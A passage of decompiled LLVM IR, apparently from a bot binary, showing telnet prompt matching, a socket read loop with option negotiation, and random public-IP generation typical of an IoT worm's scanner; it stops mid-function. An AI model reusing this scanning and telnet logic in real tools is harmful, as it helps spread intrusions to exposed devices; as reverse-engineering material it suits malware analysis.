dec_label_pc_a5bc:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5c8:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5bc, %dec_label_pc_a5c8
  %storemerge = phi i8 [ -3, %dec_label_pc_a5c8 ], [ -5, %dec_label_pc_a5bc ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a5e0:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5f4, label %dec_label_pc_a600

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a600:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a608:                                ; preds = %dec_label_pc_a5f4, %dec_label_pc_a600
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a600 ], [ -4, %dec_label_pc_a5f4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5d0, %dec_label_pc_a588, %dec_label_pc_a568, %dec_label_pc_a608
  %v5_a628 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a550, i32 1, i32 16384)
  %v1_a630 = add i32 %arg2, 2
  %v4_a644 = inttoptr i32 %v1_a630 to i32*
  %v5_a644 = call i32 @__libc_send(i32 %arg1, i32* %v4_a644, i32 1, i32 16384)
  br label %dec_label_pc_a650

dec_label_pc_a650:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a614, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a650, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a614, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a608, { 1, 0 }
  uselistorder label %dec_label_pc_a5d0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a680 = call i32 @strlen(i8* %arg1)
  %v2_a6c8 = add i32 %v3_a680, %tmp
  br label %dec_label_pc_a79c

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a704, %dec_label_pc_a6e0, %dec_label_pc_a6bc
  %v1_a6a4 = add nsw i32 %stack_var_-24.014, 1
  %v7_a6b8 = icmp sgt i32 %v3_a680, %v1_a6a4
  br i1 %v7_a6b8, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a6ac.preheader, %dec_label_pc_a6a0
  %stack_var_-24.014 = phi i32 [ %v1_a6a4, %dec_label_pc_a6a0 ], [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ]
  %v2_a6d0 = sub i32 %v2_a6c8, %stack_var_-24.014
  %v1_a6d4 = inttoptr i32 %v2_a6d0 to i8*
  %v2_a6d4 = load i8, i8* %v1_a6d4, align 1
  %v2_a6d8 = icmp eq i8 %v2_a6d4, 0
  br i1 %v2_a6d8, label %dec_label_pc_a6a0, label %dec_label_pc_a6e0

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a6bc
  %v2_a6f8 = load i8, i8* %v1_a6d4, align 1
  %v7_a6fc = icmp eq i8 %v2_a6f8, 32
  br i1 %v7_a6fc, label %dec_label_pc_a6a0, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6e0
  %v2_a71c = load i8, i8* %v1_a6d4, align 1
  %v7_a720 = icmp eq i8 %v2_a71c, 13
  br i1 %v7_a720, label %dec_label_pc_a6a0, label %dec_label_pc_a728

dec_label_pc_a728:                                ; preds = %dec_label_pc_a704
  %v2_a740 = load i8, i8* %v1_a6d4, align 1
  %v7_a744 = icmp eq i8 %v2_a740, 10
  br i1 %v7_a744, label %dec_label_pc_a6a0, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a6a0, %dec_label_pc_a6ac.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ], [ %stack_var_-24.014, %dec_label_pc_a728 ], [ %v1_a6a4, %dec_label_pc_a6a0 ]
  %v2_a760 = sub i32 %v2_a6c8, %stack_var_-24.0.lcssa
  %v1_a764 = inttoptr i32 %v2_a760 to i8*
  %v2_a764 = load i8, i8* %v1_a764, align 1
  %v2_a774 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_1b1f4.77 to i32)
  %v1_a778 = inttoptr i32 %v2_a774 to i8*
  %v2_a778 = load i8, i8* %v1_a778, align 1
  %v9_a77c = icmp eq i8 %v2_a764, %v2_a778
  %v1_a794 = add i32 %storemerge3, 1
  br i1 %v9_a77c, label %dec_label_pc_a7bc, label %dec_label_pc_a79c

dec_label_pc_a79c:                                ; preds = %dec_label_pc_a74c, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a74c ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a794, %dec_label_pc_a74c ]
  %v3_a7a4 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b1f4.77, i32 0, i32 0))
  %v3_a7ac = icmp ult i32 %storemerge3, %v3_a7a4
  br i1 %v3_a7ac, label %dec_label_pc_a6ac.preheader, label %dec_label_pc_a7bc

dec_label_pc_a6ac.preheader:                      ; preds = %dec_label_pc_a79c
  %v7_a6b813 = icmp sgt i32 %v3_a680, %stack_var_-24.1
  br i1 %v7_a6b813, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a7bc:                                ; preds = %dec_label_pc_a79c, %dec_label_pc_a74c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a74c ], [ 0, %dec_label_pc_a79c ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a680, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a74c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a7d4 = load i32, i32* @fp, align 4
  store i32 %v3_a7d4, i32* %stack_var_-16, align 4
  %v13_a7d4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a824 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a864 = udiv i32 %arg1, 32
  %v3_a870 = mul nuw nsw i32 %v3_a864, 4
  %v1_a888 = urem i32 %arg1, 32
  %v6_a890 = shl i32 1, %v1_a888
  %v1_a8b4 = add i32 %arg1, 1
  %v2_a8bc = ptrtoint i32* %stack_var_-176 to i32
  %v6_a9dc = inttoptr i32 %arg2 to i8*
  %v2_a9f0 = icmp eq i32 %arg3, 0
  %v1_a9fc = inttoptr i32 %arg6 to i8*
  %v5_aa40 = icmp sgt i32 %arg5, 0
  %v2_a878 = add nsw i32 %v3_a870, -152
  %v2_a87c = add i32 %v2_a878, %v13_a7d4
  %v1_a880 = inttoptr i32 %v2_a87c to i32*
  br label %dec_label_pc_aa18

dec_label_pc_a838.lr.ph:                          ; preds = %dec_label_pc_aa2c, %dec_label_pc_aa38
  br label %dec_label_pc_a838

dec_label_pc_a838:                                ; preds = %dec_label_pc_a838.lr.ph, %dec_label_pc_a838
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a838.lr.ph ], [ %v1_a84c, %dec_label_pc_a838 ]
  %v5_a844 = mul nuw nsw i32 %storemerge27, 4
  %v6_a844 = add i32 %v5_a844, %v2_a824
  %v7_a844 = inttoptr i32 %v6_a844 to i32*
  store i32 0, i32* %v7_a844, align 4
  %v1_a84c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a84c, 32
  br i1 %tmp30, label %dec_label_pc_a838, label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a838
  %v2_a880 = load i32, i32* %v1_a880, align 4
  %v2_a894 = or i32 %v2_a880, %v6_a890
  store i32 %v2_a894, i32* %v1_a880, align 4
  %v5_a8d0 = call i32 @__libc_select(i32 %v1_a8b4, i32 %v2_a824, i32 0, i32 0, i32 %v2_a8bc)
  %tmp31 = icmp slt i32 %v5_a8d0, 1
  br i1 %tmp31, label %dec_label_pc_aa5c, label %dec_label_pc_a8e0

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a860
  %v2_a8ec = add i32 %stack_var_-40.0, %arg6
  %v5_a8f0 = inttoptr i32 %v2_a8ec to i8*
  %v6_a904 = inttoptr i32 %v2_a8ec to i32*
  %v7_a904 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a904, i32 1, i32 0, i32 %v2_a8ec)
  %v7_a914 = icmp eq i32 %v7_a904, -1
  br i1 %v7_a914, label %dec_label_pc_a928, label %dec_label_pc_a91c

dec_label_pc_a91c:                                ; preds = %dec_label_pc_a8e0
  %v2_a920 = icmp eq i32 %v7_a904, 0
  br i1 %v2_a920, label %dec_label_pc_a928, label %dec_label_pc_a934

dec_label_pc_a928:                                ; preds = %dec_label_pc_a91c, %dec_label_pc_a8e0
  br label %dec_label_pc_aa64

dec_label_pc_a934:                                ; preds = %dec_label_pc_a91c
  %v2_a93c = add i32 %v7_a904, %stack_var_-40.0
  %v2_a948 = load i8, i8* %v5_a8f0, align 1
  %v2_a94c = icmp eq i8 %v2_a948, -1
  br i1 %v2_a94c, label %dec_label_pc_a954, label %dec_label_pc_a9d4

dec_label_pc_a954:                                ; preds = %dec_label_pc_a934
  %v1_a958 = add i32 %v2_a8ec, 1
  %v5_a96c = inttoptr i32 %v1_a958 to i32*
  %v6_a96c = call i32 @__libc_recv(i32 %arg1, i32* %v5_a96c, i32 2, i32 0, i32 %v2_a93c)
  %v7_a97c = icmp eq i32 %v6_a96c, -1
  br i1 %v7_a97c, label %dec_label_pc_a990, label %dec_label_pc_a984

dec_label_pc_a984:                                ; preds = %dec_label_pc_a954
  %v2_a988 = icmp eq i32 %v6_a96c, 0
  br i1 %v2_a988, label %dec_label_pc_a990, label %dec_label_pc_a99c

dec_label_pc_a990:                                ; preds = %dec_label_pc_a984, %dec_label_pc_a954
  br label %dec_label_pc_aa64

dec_label_pc_a99c:                                ; preds = %dec_label_pc_a984
  %v2_a9a4 = add i32 %v6_a96c, %v2_a93c
  %v5_a9b8 = call i32 @negotiate(i32 %arg1, i32 %v2_a8ec, i32 3, i32 %v2_a9a4, i32 %v2_a9a4)
  %v2_a9c0 = icmp eq i32 %v5_a9b8, 0
  br i1 %v2_a9c0, label %dec_label_pc_a9c8, label %dec_label_pc_aa18

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a99c
  br label %dec_label_pc_aa64

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_a934
  %v7_a9dc = call i32 @strstr(i32 %arg6, i8* %v6_a9dc)
  %v2_a9e4 = icmp eq i32 %v7_a9dc, 0
  br i1 %v2_a9e4, label %dec_label_pc_a9ec, label %dec_label_pc_aa50

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9d4
  br i1 %v2_a9f0, label %dec_label_pc_aa18, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9ec
  %v2_a9fc = call i32 @matchPrompt(i8* %v1_a9fc)
  %v2_aa04 = icmp eq i32 %v2_a9fc, 0
  br i1 %v2_aa04, label %dec_label_pc_aa18, label %dec_label_pc_aa50

dec_label_pc_aa18:                                ; preds = %dec_label_pc_a99c, %dec_label_pc_a9f8, %dec_label_pc_a9ec, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a9a4, %dec_label_pc_a99c ], [ %v2_a93c, %dec_label_pc_a9ec ], [ %v2_a93c, %dec_label_pc_a9f8 ]
  %v1_aa1c = add i32 %stack_var_-40.0, 2
  %v6_aa28 = icmp slt i32 %v1_aa1c, %arg7
  br i1 %v6_aa28, label %dec_label_pc_aa2c, label %dec_label_pc_aa5c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa18
  %v3_aa2c = load i32, i32* %stack_var_-176, align 4
  %v5_aa34 = icmp sgt i32 %v3_aa2c, 0
  br i1 %v5_aa34, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa2c
  br i1 %v5_aa40, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa5c

dec_label_pc_aa50:                                ; preds = %dec_label_pc_a9d4, %dec_label_pc_a9f8
  br label %dec_label_pc_aa64

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_a860, %dec_label_pc_aa38, %dec_label_pc_aa18
  br label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50, %dec_label_pc_a9c8, %dec_label_pc_a990, %dec_label_pc_a928, %dec_label_pc_aa5c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_aa5c ], [ 1, %dec_label_pc_aa50 ], [ 0, %dec_label_pc_a928 ], [ 0, %dec_label_pc_a990 ], [ 0, %dec_label_pc_a9c8 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a96c, { 1, 2, 0 }
  uselistorder i32 %v7_a904, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a824, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_aa64, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_aa5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %dec_label_pc_aa18, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a838, { 1, 0 }
  uselistorder label %dec_label_pc_a838.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_aa78 = load i32, i32* @fp, align 4
  store i32 43648, i32* %stack_var_-4, align 4
  %v2_aa7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aa7c, i32* @fp, align 4
  %v2_aa80 = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* bitcast (i32* @global_var_265e3.80 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_265e4.81 to i8*), align 4
  store i8 0, i8* @global_var_265e5.82, align 1
  store i8 0, i8* @global_var_265e6.83, align 1
  %v0_aab4 = call i32 @random()
  %v2_aac4 = srem i32 %v0_aab4, 255
  %v1_aad4 = trunc i32 %v2_aac4 to i8
  store i8 %v1_aad4, i8* bitcast (i32* @global_var_265e3.80 to i8*), align 4
  %v0_aad8 = call i32 @random()
  %v2_aae8 = srem i32 %v0_aad8, 255
  %v1_aaf8 = trunc i32 %v2_aae8 to i8
  store i8 %v1_aaf8, i8* bitcast (i32* @global_var_265e4.81 to i8*), align 4
  %v0_aafc = call i32 @random()
  %v2_ab0c = srem i32 %v0_aafc, 255
  %v1_ab1c = trunc i32 %v2_ab0c to i8
  store i8 %v1_ab1c, i8* @global_var_265e5.82, align 1
  %v0_ab20 = call i32 @random()
  %v2_ab30 = srem i32 %v0_ab20, 255
  %v1_ab40 = trunc i32 %v2_ab30 to i8
  store i8 %v1_ab40, i8* @global_var_265e6.83, align 1
  %v0_ab44 = call i32 @random()
  %v2_ab54 = srem i32 %v0_ab44, 208
  %v2_ab64 = icmp eq i32 %v2_ab54, 0
  br i1 %v2_ab64, label %dec_label_pc_ab6c, label %dec_label_pc_ab94

dec_label_pc_ab6c:                                ; preds = %entry
  %v3_ab78 = load i8, i8* @global_var_265e5.82, align 1
  %v3_ab84 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ab90 = sext i8 %v3_ab78 to i32
  %v6_ab90 = sext i8 %v3_ab84 to i32
  %v8_ab90 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b1fc.85 to i32), i32 %v4_ab90, i32 %v6_ab90, i32 0)
  br label %dec_label_pc_ab94

dec_label_pc_ab94:                                ; preds = %entry, %dec_label_pc_ab6c
  %v7_ab98 = icmp eq i32 %v2_ab54, 1
  br i1 %v7_ab98, label %dec_label_pc_aba0, label %dec_label_pc_abc8

dec_label_pc_aba0:                                ; preds = %dec_label_pc_ab94
  %v3_abac = load i8, i8* @global_var_265e5.82, align 1
  %v3_abb8 = load i8, i8* @global_var_265e6.83, align 1
  %v4_abc4 = sext i8 %v3_abac to i32
  %v6_abc4 = sext i8 %v3_abb8 to i32
  %v8_abc4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([15 x i8]* @global_var_1b208.87 to i32), i32 %v4_abc4, i32 %v6_abc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_ab94, %dec_label_pc_aba0
  %v7_abcc = icmp eq i32 %v2_ab54, 2
  br i1 %v7_abcc, label %dec_label_pc_abd4, label %dec_label_pc_abfc

dec_label_pc_abd4:                                ; preds = %dec_label_pc_abc8
  %v3_abe0 = load i8, i8* @global_var_265e5.82, align 1
  %v3_abec = load i8, i8* @global_var_265e6.83, align 1
  %v4_abf8 = sext i8 %v3_abe0 to i32
  %v6_abf8 = sext i8 %v3_abec to i32
  %v8_abf8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b218.89 to i32), i32 %v4_abf8, i32 %v6_abf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_abd4
  %v7_ac00 = icmp eq i32 %v2_ab54, 3
  br i1 %v7_ac00, label %dec_label_pc_ac08, label %dec_label_pc_ac30

dec_label_pc_ac08:                                ; preds = %dec_label_pc_abfc
  %v3_ac14 = load i8, i8* @global_var_265e5.82, align 1
  %v3_ac20 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ac2c = sext i8 %v3_ac14 to i32
  %v6_ac2c = sext i8 %v3_ac20 to i32
  %v8_ac2c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b224.91 to i32), i32 %v4_ac2c, i32 %v6_ac2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_abfc, %dec_label_pc_ac08
  %v7_ac34 = icmp eq i32 %v2_ab54, 4
  br i1 %v7_ac34, label %dec_label_pc_ac3c, label %dec_label_pc_ac64

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac30
  %v3_ac48 = load i8, i8* @global_var_265e5.82, align 1
  %v3_ac54 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ac60 = sext i8 %v3_ac48 to i32
  %v6_ac60 = sext i8 %v3_ac54 to i32
  %v8_ac60 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b234.93 to i32), i32 %v4_ac60, i32 %v6_ac60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac30, %dec_label_pc_ac3c
  %v7_ac68 = icmp eq i32 %v2_ab54, 5
  br i1 %v7_ac68, label %dec_label_pc_ac70, label %dec_label_pc_ac98

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac64
  %v3_ac7c = load i8, i8* @global_var_265e5.82, align 1
  %v3_ac88 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ac94 = sext i8 %v3_ac7c to i32
  %v6_ac94 = sext i8 %v3_ac88 to i32
  %v8_ac94 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b240.95 to i32), i32 %v4_ac94, i32 %v6_ac94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_ac70
  %v7_ac9c = icmp eq i32 %v2_ab54, 6
  br i1 %v7_ac9c, label %dec_label_pc_aca4, label %dec_label_pc_accc

dec_label_pc_aca4:                                ; preds = %dec_label_pc_ac98
  %v3_acb0 = load i8, i8* @global_var_265e5.82, align 1
  %v3_acbc = load i8, i8* @global_var_265e6.83, align 1
  %v4_acc8 = sext i8 %v3_acb0 to i32
  %v6_acc8 = sext i8 %v3_acbc to i32
  %v8_acc8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b250.97 to i32), i32 %v4_acc8, i32 %v6_acc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_ac98, %dec_label_pc_aca4
  %v7_acd0 = icmp eq i32 %v2_ab54, 7
  br i1 %v7_acd0, label %dec_label_pc_acd8, label %dec_label_pc_ad00

dec_label_pc_acd8:                                ; preds = %dec_label_pc_accc
  %v3_ace4 = load i8, i8* @global_var_265e5.82, align 1
  %v3_acf0 = load i8, i8* @global_var_265e6.83, align 1
  %v4_acfc = sext i8 %v3_ace4 to i32
  %v6_acfc = sext i8 %v3_acf0 to i32
  %v8_acfc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b25c.99 to i32), i32 %v4_acfc, i32 %v6_acfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %dec_label_pc_accc, %dec_label_pc_acd8
  %v7_ad04 = icmp eq i32 %v2_ab54, 8
  br i1 %v7_ad04, label %dec_label_pc_ad0c, label %dec_label_pc_ad34

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad00
  %v3_ad18 = load i8, i8* @global_var_265e5.82, align 1
  %v3_ad24 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ad30 = sext i8 %v3_ad18 to i32
  %v6_ad30 = sext i8 %v3_ad24 to i32
  %v8_ad30 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b26c.101 to i32), i32 %v4_ad30, i32 %v6_ad30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad34

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad00, %dec_label_pc_ad0c
  %v7_ad38 = icmp eq i32 %v2_ab54, 9
  br i1 %v7_ad38, label %dec_label_pc_ad40, label %dec_label_pc_ad68

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad34
  %v3_ad4c = load i8, i8* @global_var_265e5.82, align 1
  %v3_ad58 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ad64 = sext i8 %v3_ad4c to i32
  %v6_ad64 = sext i8 %v3_ad58 to i32
  %v8_ad64 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b27c.103 to i32), i32 %v4_ad64, i32 %v6_ad64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad68

dec_label_pc_ad68:                                ; preds = %dec_label_pc_ad34, %dec_label_pc_ad40
  %v7_ad6c = icmp eq i32 %v2_ab54, 10
  br i1 %v7_ad6c, label %dec_label_pc_ad74, label %dec_label_pc_ad9c

dec_label_pc_ad74:                                ; preds = %dec_label_pc_ad68
  %v3_ad80 = load i8, i8* @global_var_265e5.82, align 1
  %v3_ad8c = load i8, i8* @global_var_265e6.83, align 1
  %v4_ad98 = sext i8 %v3_ad80 to i32
  %v6_ad98 = sext i8 %v3_ad8c to i32
  %v8_ad98 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b28c.105 to i32), i32 %v4_ad98, i32 %v6_ad98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad9c

dec_label_pc_ad9c:                                ; preds = %dec_label_pc_ad68, %dec_label_pc_ad74
  %v7_ada0 = icmp eq i32 %v2_ab54, 11
  br i1 %v7_ada0, label %dec_label_pc_ada8, label %dec_label_pc_add0

dec_label_pc_ada8:                                ; preds = %dec_label_pc_ad9c
  %v3_adb4 = load i8, i8* @global_var_265e5.82, align 1
  %v3_adc0 = load i8, i8* @global_var_265e6.83, align 1
  %v4_adcc = sext i8 %v3_adb4 to i32
  %v6_adcc = sext i8 %v3_adc0 to i32
  %v8_adcc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b29c.107 to i32), i32 %v4_adcc, i32 %v6_adcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ad9c, %dec_label_pc_ada8
  %v7_add4 = icmp eq i32 %v2_ab54, 12
  br i1 %v7_add4, label %dec_label_pc_addc, label %dec_label_pc_ae04

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v3_ade8 = load i8, i8* @global_var_265e5.82, align 1
  %v3_adf4 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ae00 = sext i8 %v3_ade8 to i32
  %v6_ae00 = sext i8 %v3_adf4 to i32
  %v8_ae00 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b2a8.109 to i32), i32 %v4_ae00, i32 %v6_ae00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %dec_label_pc_add0, %dec_label_pc_addc
  %v7_ae08 = icmp eq i32 %v2_ab54, 13
  br i1 %v7_ae08, label %dec_label_pc_ae10, label %dec_label_pc_ae38

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae04
  %v3_ae1c = load i8, i8* @global_var_265e5.82, align 1
  %v3_ae28 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ae34 = sext i8 %v3_ae1c to i32
  %v6_ae34 = sext i8 %v3_ae28 to i32
  %v8_ae34 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b2b8.111 to i32), i32 %v4_ae34, i32 %v6_ae34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae38

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ae04, %dec_label_pc_ae10
  %v7_ae3c = icmp eq i32 %v2_ab54, 14
  br i1 %v7_ae3c, label %dec_label_pc_ae44, label %dec_label_pc_ae6c

dec_label_pc_ae44:                                ; preds = %dec_label_pc_ae38
  %v3_ae50 = load i8, i8* @global_var_265e5.82, align 1
  %v3_ae5c = load i8, i8* @global_var_265e6.83, align 1
  %v4_ae68 = sext i8 %v3_ae50 to i32
  %v6_ae68 = sext i8 %v3_ae5c to i32
  %v8_ae68 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b2c8.113 to i32), i32 %v4_ae68, i32 %v6_ae68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ae44
  %v7_ae70 = icmp eq i32 %v2_ab54, 15
  br i1 %v7_ae70, label %dec_label_pc_ae78, label %dec_label_pc_aea0

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae84 = load i8, i8* @global_var_265e5.82, align 1
  %v3_ae90 = load i8, i8* @global_var_265e6.83, align 1
  %v4_ae9c = sext i8 %v3_ae84 to i32
  %v6_ae9c = sext i8 %v3_ae90 to i32
  %v8_ae9c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b2d8.115 to i32), i32 %v4_ae9c, i32 %v6_ae9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea0

dec_label_pc_aea0:                                ; preds = %dec_label_pc_ae6c, %dec_label_pc_ae78
  %v7_aea4 = icmp eq i32 %v2_ab54, 16
  br i1 %v7_aea4, label %dec_label_pc_aeac, label %dec_label_pc_aed4

dec_label_pc_aeac:                                ; preds = %dec_label_pc_aea0
  %v3_aeb8 = load i8, i8* @global_var_265e5.82, align 1
  %v3_aec4 = load i8, i8* @global_var_265e6.83, align 1
  %v4_aed0 = sext i8 %v3_aeb8 to i32
  %v6_aed0 = sext i8 %v3_aec4 to i32
  %v8_aed0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b2e8.117 to i32), i32 %v4_aed0, i32 %v6_aed0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed4

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aea0, %dec_label_pc_aeac
  %v7_aed8 = icmp eq i32 %v2_ab54, 17
  br i1 %v7_aed8, label %dec_label_pc_aee0, label %dec_label_pc_af08

dec_label_pc_aee0:                                ; preds = %dec_label_pc_aed4
  %v3_aeec = load i8, i8* @global_var_265e5.82, align 1
  %v3_aef8 = load i8, i8* @global_var_265e6.83, align 1
  %v4_af04 = sext i8 %v3_aeec to i32
